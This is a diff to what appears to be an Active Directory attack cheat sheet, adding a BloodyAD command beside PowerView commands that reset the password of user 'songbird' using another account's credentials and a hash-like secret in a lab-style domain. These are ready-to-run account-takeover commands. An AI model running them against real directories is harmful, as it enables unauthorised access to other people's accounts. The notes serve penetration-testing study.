@@ -28,3 +28,13 @@ Here are are making a SecureString for new **songbird's** password and changing 
 PS C:\> $songbirdPassword = ConvertTo-SecureString 'S4MUR41' -AsPlainText -Force
 PS C:> Set-DomainUserPassword -Identity songbird -AccountPassword $songbirdPassword -Credential $Cred -Verbose
 ```
+
+## <mark style="color:yellow;">BloodyAD</mark>
+
+If you have right to change someone's password, you can use **BloodyAD** Tool [**\[LINK\]**](https://github.com/CravateRouge/bloodyAD)
+
+```bash
+bloodyAD --host 13.13.13.13 -d militech.local -u 's.reed' -p :4bfkohjaosdoi234hjhaf set password 'songbird' 'P@ssword123'
+```
+
+> Here we changing songbird's password by using s.reed credentials.
